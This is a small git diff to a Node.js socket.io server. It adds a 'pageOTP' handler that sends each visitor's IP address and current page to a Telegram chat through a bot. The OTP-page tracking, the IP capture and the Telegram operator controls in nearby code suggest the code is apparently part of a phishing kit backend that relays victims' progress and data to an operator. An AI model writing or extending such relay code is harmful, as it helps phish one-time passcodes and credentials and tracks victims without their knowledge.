@@ -222,6 +222,18 @@ io.on('connection', (socket, req) => {
         //console.log(data)
     })
 
+     socket.on('pageOTP', (data) => {
+        if(userIP){
+            user = data
+            user.ip = userIP
+            let message = `User on ${data.page} Page\n\nIP:${user.ip}`
+            bot.sendMessage(chatId, message);
+        }
+       
+        //console.log(data)
+    })
+
+
     socket.on('loading', (data) => {
         const opts = {
             reply_markup: {
